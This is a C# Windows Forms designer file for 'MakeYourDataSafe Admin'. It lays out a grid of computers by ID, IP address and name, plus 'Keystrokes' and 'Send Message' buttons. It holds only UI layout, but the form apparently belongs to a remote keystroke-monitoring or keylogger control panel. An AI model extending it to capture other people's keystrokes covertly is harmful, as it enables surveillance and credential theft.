namespace MakeYourDataSafe_Admin
{
    partial class Form1
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.name = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.ip = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.id = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.Computers = new System.Windows.Forms.DataGridView();
            this.keys = new System.Windows.Forms.Button();
            this.msg = new System.Windows.Forms.Button();
            ((System.ComponentModel.ISupportInitialize)(this.Computers)).BeginInit();
            this.SuspendLayout();
            // 
            // name
            // 
            this.name.HeaderText = "PC Name";
            this.name.Name = "name";
            this.name.ReadOnly = true;
            this.name.Resizable = System.Windows.Forms.DataGridViewTriState.True;
            this.name.SortMode = System.Windows.Forms.DataGridViewColumnSortMode.NotSortable;
            // 
            // ip
            // 
            this.ip.HeaderText = "IP Address";
            this.ip.Name = "ip";
            this.ip.ReadOnly = true;
            this.ip.Resizable = System.Windows.Forms.DataGridViewTriState.True;
            this.ip.SortMode = System.Windows.Forms.DataGridViewColumnSortMode.NotSortable;
            // 
            // id
            // 
            this.id.HeaderText = "ID";
            this.id.Name = "id";
            this.id.ReadOnly = true;
            this.id.Resizable = System.Windows.Forms.DataGridViewTriState.True;
            this.id.SortMode = System.Windows.Forms.DataGridViewColumnSortMode.NotSortable;
            // 
            // Computers
            // 
            this.Computers.AllowUserToAddRows = false;
            this.Computers.AllowUserToDeleteRows = false;
            this.Computers.AllowUserToResizeColumns = false;
            this.Computers.AllowUserToResizeRows = false;
            this.Computers.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
            this.Computers.Columns.AddRange(new System.Windows.Forms.DataGridViewColumn[] {
            this.id,
            this.ip,
            this.name});
            this.Computers.ImeMode = System.Windows.Forms.ImeMode.NoControl;
            this.Computers.Location = new System.Drawing.Point(0, 6);
            this.Computers.MultiSelect = false;
            this.Computers.Name = "Computers";
            this.Computers.ReadOnly = true;
            this.Computers.RowHeadersVisible = false;
            this.Computers.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
            this.Computers.Size = new System.Drawing.Size(303, 321);
            this.Computers.StandardTab = true;
            this.Computers.TabIndex = 1;
            this.Computers.SelectionChanged += new System.EventHandler(this.rowChange);
            // 
            // keys
            // 
            this.keys.Location = new System.Drawing.Point(309, 6);
            this.keys.Name = "keys";
            this.keys.Size = new System.Drawing.Size(121, 36);
            this.keys.TabIndex = 2;
            this.keys.Text = "Keystrokes";
            this.keys.UseVisualStyleBackColor = true;
            this.keys.Click += new System.EventHandler(this.keys_Click);
            // 
            // msg
            // 
            this.msg.Location = new System.Drawing.Point(309, 48);
            this.msg.Name = "msg";
            this.msg.Size = new System.Drawing.Size(121, 36);
            this.msg.TabIndex = 3;
            this.msg.Text = "Send Message";
            this.msg.UseVisualStyleBackColor = true;
            // 
            // Form1
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(437, 333);
            this.Controls.Add(this.msg);
            this.Controls.Add(this.keys);
            this.Controls.Add(this.Computers);
            this.Name = "Form1";
            this.Text = "MakeYourDataSafe Admin";
            this.Load += new System.EventHandler(this.Form1_Load);
            ((System.ComponentModel.ISupportInitialize)(this.Computers)).EndInit();
            this.ResumeLayout(false);

        }

        private void Computers_SelectionChanged(object sender, System.EventArgs e)
        {
            throw new System.NotImplementedException();
        }

        #endregion

        private System.Windows.Forms.DataGridViewTextBoxColumn name;
        private System.Windows.Forms.DataGridViewTextBoxColumn ip;
        private System.Windows.Forms.DataGridViewTextBoxColumn id;
        private System.Windows.Forms.DataGridView Computers;
        private System.Windows.Forms.Button keys;
        private System.Windows.Forms.Button msg;
    }
}

